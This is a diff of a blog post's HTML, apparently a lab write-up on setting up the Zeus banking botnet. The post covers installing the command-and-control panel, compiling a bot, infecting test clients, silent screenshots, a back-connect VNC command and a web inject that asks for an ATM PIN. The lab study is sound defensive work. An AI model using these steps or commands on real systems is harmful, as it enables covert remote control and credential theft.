@@ -268,8 +268,7 @@ if (!doNotTrack) {
 <h3 id="so-botnet">So, botnet?</h3>
 <p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the [Zeus botnet](<a href="https://en.wikipedia.org/wiki/Zeus_(malware">https://en.wikipedia.org/wiki/Zeus_(malware</a>)). Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>
 <p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article [here](<a href="https://en.wikipedia.org/wiki/Zeus_(malware">https://en.wikipedia.org/wiki/Zeus_(malware</a>)) does a excellent job to describe the process in a image:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_fraud_scheme.jpg"/> 
+<figure><img src="https://leonjza.github.io/images/zues_fraud_scheme.jpg"/>
 </figure>
 
 <h3 id="the-zeus-bot-architecture">The Zeus Bot Architecture</h3>
@@ -329,31 +328,26 @@ if (!doNotTrack) {
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># Zeus cp.php mb_internal_encoding error</span>
 [Mon Sep <span style="color:#f60">23</span> 10:57:45 2013] [error] [client 172.16.50.1] PHP Fatal error:  Call to undefined <span style="color:#f00">function</span> mb_internal_encoding() in /var/www/html/z/system/global.php on line <span style="color:#f60">1</span>
 </code></pre></div><p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_cp.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_cp.png"/>
 </figure>
 
 <h4 id="installing-the-command--control">Installing the Command &amp; Control</h4>
 <p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_cp_install.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_cp_install.png"/>
 </figure>
 
 <p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_cp_internal.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_cp_internal.png"/>
 </figure>
 
 <h4 id="compiling-the-bot">Compiling the Bot</h4>
 <p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>
 <p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_compiler_config.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_compiler_config.png"/>
 </figure>
 
 <p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_bot_compiler.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_bot_compiler.png"/>
 </figure>
 
 <p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>
@@ -395,19 +389,16 @@ if (!doNotTrack) {
 172.16.50.2 - - [19/Sep/2013:11:01:50 -0400] <span style="color:#87ceeb">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#f60">200</span> - <span style="color:#87ceeb">&#34;-&#34;</span> <span style="color:#87ceeb">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
 172.16.50.2 - - [19/Sep/2013:11:01:55 -0400] <span style="color:#87ceeb">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#f60">200</span> - <span style="color:#87ceeb">&#34;-&#34;</span> <span style="color:#87ceeb">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
 </code></pre></div><p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_bot_zombie.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_bot_zombie.png"/>
 </figure>
 
 <p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_bot_listener_port.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_bot_listener_port.png"/>
 </figure>
 
 <p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>
 <p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_bot_screenshot.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_bot_screenshot.png"/>
 </figure>
 
 <p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>
@@ -428,8 +419,7 @@ if (!doNotTrack) {
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bot_bc_add vnc 172.16.50.181 <span style="color:#f60">9000</span>
 </code></pre></div><p>This tells the bot where to connect to wait for a VNC session.</p>
 <p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_back_connect_vnc.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_back_connect_vnc.png"/>
 </figure>
 
 <h3 id="web-injects-the-real-threat">Web Injects, the real threat.</h3>
@@ -448,8 +438,7 @@ data_end
 data_after
 data_end
 </code></pre></div><p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/zues_web_inject_examples.png"/> 
+<figure><img src="https://leonjza.github.io/images/zues_web_inject_examples.png"/>
 </figure>
 
 <h3 id="summary">Summary</h3>
